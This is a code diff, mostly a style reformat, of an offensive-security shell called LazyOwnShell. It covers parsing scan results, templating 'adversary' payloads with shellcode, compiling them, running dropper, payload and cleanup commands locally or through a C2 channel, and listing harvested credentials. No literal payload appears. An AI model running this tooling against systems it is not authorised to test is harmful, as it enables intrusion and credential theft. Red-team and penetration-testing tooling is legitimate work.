+                    "protocol": row["PROTOCOL"],
+                    "service": row["SERVICE"],
+                    "version": row["VERSION"],
                 }
 
-                found_service = next((s for s in all_data['services'] if
-                                    s['ip'] == service_entry['ip'] and
-                                    s['port'] == service_entry['port'] and
-                                    s['protocol'] == service_entry['protocol'] and
-                                    s['service'] == service_entry['service'] and
-                                    s['version'] == service_entry['version']), None)
+                found_service = next(
+                    (
+                        s
+                        for s in all_data["services"]
+                        if s["ip"] == service_entry["ip"]
+                        and s["port"] == service_entry["port"]
+                        and s["protocol"] == service_entry["protocol"]
+                        and s["service"] == service_entry["service"]
+                        and s["version"] == service_entry["version"]
+                    ),
+                    None,
+                )
                 if not found_service:
-                    all_data['services'].append(service_entry)
+                    all_data["services"].append(service_entry)
 
                 vulnerability_entry = {
                     "ip": ip,
-                    "port": int(row['PORT']) if row['PORT'] else None,
-                    "protocol": row['PROTOCOL'],
-                    "service": row['SERVICE'],
-                    "version": row['VERSION']
+                    "port": int(row["PORT"]) if row["PORT"] else None,
+                    "protocol": row["PROTOCOL"],
+                    "service": row["SERVICE"],
+                    "version": row["VERSION"],
                 }
 
-
-                found_service_for_vuln = next((s for s in all_data['services'] if
-                                               s['ip'] == vulnerability_entry['ip'] and
-                                               s['port'] == vulnerability_entry['port'] and
-                                               s['protocol'] == vulnerability_entry['protocol'] and
-                                               s['service'] == vulnerability_entry['service'] and
-                                               s['version'] == vulnerability_entry['version']), None)
+                found_service_for_vuln = next(
+                    (
+                        s
+                        for s in all_data["services"]
+                        if s["ip"] == vulnerability_entry["ip"]
+                        and s["port"] == vulnerability_entry["port"]
+                        and s["protocol"] == vulnerability_entry["protocol"]
+                        and s["service"] == vulnerability_entry["service"]
+                        and s["version"] == vulnerability_entry["version"]
+                    ),
+                    None,
+                )
                 if found_service_for_vuln:
                     if "vulnerabilities" not in found_service_for_vuln:
                         found_service_for_vuln["vulnerabilities"] = []
 
                     vuln_id = f"{ip}:{row['PORT']}:{row['SERVICE']}"
-                    if vuln_id not in [v['id'] for v in found_service_for_vuln["vulnerabilities"] if 'id' in v]:
-                        found_service_for_vuln["vulnerabilities"].append({"id": vuln_id, "description": "Known vulnerability (inferred from filename)"})
+                    if vuln_id not in [v["id"] for v in found_service_for_vuln["vulnerabilities"] if "id" in v]:
+                        found_service_for_vuln["vulnerabilities"].append(
+                            {"id": vuln_id, "description": "Known vulnerability (inferred from filename)"}
+                        )
 
     @cmd2.with_category(post_exploitation_category)
-
     def _load_adversaries(self):
         adversaries = []
         for file in glob.glob("lazyadversaries/*.yaml"):
-            with open(file, 'r') as f:
+            with open(file, "r") as f:
                 try:
                     data = yaml.safe_load(f)
                     if isinstance(data, list):
@@ -4759,26 +4750,26 @@ class LazyOwnShell(cmd2.Cmd):
             return input("Enter ID: "), None
 
     def _patch_template_if_needed(self, adversary, path, replacements):
-        template_path = os.path.join(path, adversary['output_path'], adversary['name'])
+        template_path = os.path.join(path, adversary["output_path"], adversary["name"])
         if os.path.exists(template_path):
-            with open(template_path, 'r') as f:
+            with open(template_path, "r") as f:
                 content = f.read()
                 for key, val in replacements.items():
                     content = content.replace(f"{{{key}}}", str(val))
-            with open(template_path, 'w') as f:
+            with open(template_path, "w") as f:
                 f.write(content)
 
     def _build_command_stack(self, adversary, r):
         return {
-            'local': [
-                replace_placeholders(adversary['copy_command'], r),
-                replace_placeholders(adversary['replace_command'].replace("[shellcode]", "{shellcode}"), r),
-                replace_placeholders(adversary['compile'], r),
+            "local": [
+                replace_placeholders(adversary["copy_command"], r),
+                replace_placeholders(adversary["replace_command"].replace("[shellcode]", "{shellcode}"), r),
+                replace_placeholders(adversary["compile"], r),
             ],
-            'remote': [
-                replace_placeholders(adversary['droper'], r),
-                replace_placeholders(adversary['payload'], r),
-                replace_placeholders(adversary['clean_cmd'], r),
+            "remote": [
+                replace_placeholders(adversary["droper"], r),
+                replace_placeholders(adversary["payload"], r),
+                replace_placeholders(adversary["clean_cmd"], r),
             ],
         }
 
@@ -4790,18 +4781,20 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Encoded Cmd: {commands['remote'][1]}")
 
     def _execute_commands(self, confirm, remote_cmds):
-        if confirm == 'l':
+        if confirm == "l":
             for cmd in remote_cmds:
                 self.display_toastr(cmd)
                 subprocess.run(shlex.split(cmd), capture_output=True)
                 time.sleep(1)
-        elif confirm == 'r':
+        elif confirm == "r":
             for cmd in remote_cmds:
                 self.issue_command_to_c2(cmd, self.c2_clientid)
                 time.sleep(1)
         else:
             for cmd in remote_cmds:
-                subprocess.Popen(['xclip', '-selection', 'clipboard'], stdin=subprocess.PIPE).communicate(input=cmd.encode())
+                subprocess.Popen(["xclip", "-selection", "clipboard"], stdin=subprocess.PIPE).communicate(
+                    input=cmd.encode()
+                )
                 print_msg(f"Command copied: {cmd}")
             print_warn("Execution cancelled.")
 
@@ -4818,19 +4811,20 @@ class LazyOwnShell(cmd2.Cmd):
                 category = a
         try:
             from modules.event_bus import EventCategory, get_event_bus
+
             bus = get_event_bus()
             if category:
                 events = bus.history(n, EventCategory(category))
             else:
                 events = bus.history(n)
-            print_msg(f"{'='*70}")
+            print_msg(f"{'=' * 70}")
             print_msg(f"  EventBus Log (last {len(events)})")
-            print_msg(f"{'='*70}")
+            print_msg(f"{'=' * 70}")
             for ev in events:
-                ts = ev.ts if hasattr(ev, 'ts') else ''
-                ts_str = time.strftime('%H:%M:%S', time.localtime(ts)) if ts else ''
+                ts = ev.ts if hasattr(ev, "ts") else ""
+                ts_str = time.strftime("%H:%M:%S", time.localtime(ts)) if ts else ""
                 print_msg(f"  [{ts_str}] [{ev.category.value}] {ev.event_type} from {ev.source} target={ev.target}")
-            print_msg(f"{'='*70}")
+            print_msg(f"{'=' * 70}")
         except Exception as e:
             print_error(f"event_log failed: {e}")
 
@@ -4839,30 +4833,37 @@ class LazyOwnShell(cmd2.Cmd):
         """Show unified StateManager snapshot (DB + JSON caches)."""
         try:
             from modules.state_manager import get_state_manager
+
             sm = get_state_manager()
             snap = sm.session_snapshot()
-            print_msg(f"{'='*60}")
-            print_msg(f"  Campaign Snapshot")
-            print_msg(f"{'='*60}")
+            print_msg(f"{'=' * 60}")
+            print_msg("  Campaign Snapshot")
+            print_msg(f"{'=' * 60}")
             print_msg(f"  Phase:  {snap.phase}")
             print_msg(f"  Target: {snap.active_target}")
             print_msg(f"  LHOST:  {snap.lhost}")
             print_msg(f"  Domain: {snap.domain}")
-            print_msg(f"  Hosts:  {snap.total_hosts} | Services: {snap.total_services} | Vulns: {snap.total_vulns} | Creds: {snap.total_creds}")
+            print_msg(
+                f"  Hosts:  {snap.total_hosts} | Services: {snap.total_services} | Vulns: {snap.total_vulns} | Creds: {snap.total_creds}"
+            )
             print_msg(f"  Pending objectives: {snap.pending_objectives}")
             if snap.hosts:
-                print_msg(f"  --- Hosts ---")
+                print_msg("  --- Hosts ---")
                 for h in snap.hosts:
-                    print_msg(f"    {h.address} [{h.state}] {h.hostname} ({h.os}) svc={h.services_count} creds={h.creds_count} vulns={h.vulns_count}")
+                    print_msg(
+                        f"    {h.address} [{h.state}] {h.hostname} ({h.os}) svc={h.services_count} creds={h.creds_count} vulns={h.vulns_count}"
+                    )
             if snap.credentials:
                 print_msg(f"  --- Credentials ({len(snap.credentials)}) ---")
                 for c in snap.credentials[:10]:
-                    print_msg(f"    {c.get('username','')}@{c.get('host','')} [{c.get('type','')}] via {c.get('origin','')}")
+                    print_msg(
+                        f"    {c.get('username', '')}@{c.get('host', '')} [{c.get('type', '')}] via {c.get('origin', '')}"
+                    )
             if snap.vulnerabilities:
                 print_msg(f"  --- Vulnerabilities ({len(snap.vulnerabilities)}) ---")
                 for v in snap.vulnerabilities[:10]:
-                    print_msg(f"    {v.get('name','')} [{v.get('severity','')}] on {v.get('host','')}")
-            print_msg(f"{'='*60}")
+                    print_msg(f"    {v.get('name', '')} [{v.get('severity', '')}] on {v.get('host', '')}")
+            print_msg(f"{'=' * 60}")
         except Exception as e:
             print_error(f"state_snapshot failed: {e}")
 
@@ -4874,9 +4875,10 @@ class LazyOwnShell(cmd2.Cmd):
             return
         try:
             from modules.unified_bridge import UnifiedBridge
+
             bridge = UnifiedBridge.get()
             result = bridge.route(line.strip())
-            print_msg(f"{'='*50}")
+            print_msg(f"{'=' * 50}")
             print_msg(f"  Prompt:     {result.prompt}")
             print_msg(f"  Tool:       {result.tool}")
             print_msg(f"  Command:    {result.command}")
@@ -4884,7 +4886,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"  Confidence: {result.confidence:.2f}")
             print_msg(f"  Phase:      {result.phase}")
             print_msg(f"  Error:      {result.error}")
-            print_msg(f"{'='*50}")
+            print_msg(f"{'=' * 50}")
         except Exception as e:
             print_error(f"route failed: {e}")
 
@@ -4936,28 +4938,26 @@ def main():
     old = startup_ns.old_banner
     if startup_ns.command:
         cmd = startup_ns.command
-        subprocess.run(['ip', 'a', 'show', 'scope', 'global'])
-        p.onecmd('ipp')
+        subprocess.run(["ip", "a", "show", "scope", "global"])
+        p.onecmd("ipp")
         p.onecmd("p")
         p.onecmd(cmd)
         p.cmdloop()
     elif startup_ns.payload:
         payload = startup_ns.payload
-        subprocess.run(['ip', 'a', 'show', 'scope', 'global'])
-        p.onecmd(f'payload {payload}')
-        p.onecmd('ipp')
+        subprocess.run(["ip", "a", "show", "scope", "global"])
+        p.onecmd(f"payload {payload}")
+        p.onecmd("ipp")
 
     if NOBANNER is False:
         if not old:
             subprocess.run([sys.executable, "banner.py"])
-        print(
-            f"    {RED}{BANNER}{MAGENTA}{BOLD}Autor: {CYAN}{BOLD}{BG_RED}grisUN0{RESET}"
-        )
+        print(f"    {RED}{BANNER}{MAGENTA}{BOLD}Autor: {CYAN}{BOLD}{BG_RED}grisUN0{RESET}")
 
     else:
         p.onecmd("rhost clean")
-    p.onecmd('p')
-    p.onecmd('ipp')
+    p.onecmd("p")
+    p.onecmd("ipp")
     _start_user = str(config.get("start_user", "") or "").strip()
     _start_pass = str(config.get("start_pass", "") or "").strip()
     if _start_user and _start_user != "CHANGE_ME" and _start_pass and _start_pass != "CHANGE_ME":
